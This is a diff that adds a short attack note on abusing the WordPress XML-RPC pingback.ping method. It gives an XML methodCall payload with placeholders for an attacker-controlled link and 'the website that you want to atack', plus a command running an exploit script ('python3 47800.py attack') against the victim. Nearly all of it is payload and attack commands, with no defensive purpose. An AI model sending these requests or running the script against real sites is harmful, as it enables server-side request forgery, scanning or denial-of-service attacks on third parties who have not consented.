@@ -1,0 +1,23 @@
+#Change GET by POST
+GET -> POST 
+
+
+# Add this code and change link1 by what you copied in the clipboard
+# change link 2 by the link of the website that you want to atack
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>http://link1</string></value>
+</param>
+<param>
+<value><string>https://link2/</string></value>
+</param>
+</params>
+</methodCall>
+
+
+
+# when you you'll get a wingback from the victim website you can use the file 47800.py to attack
+
+python3 47800.py attack http://link1 http://link2
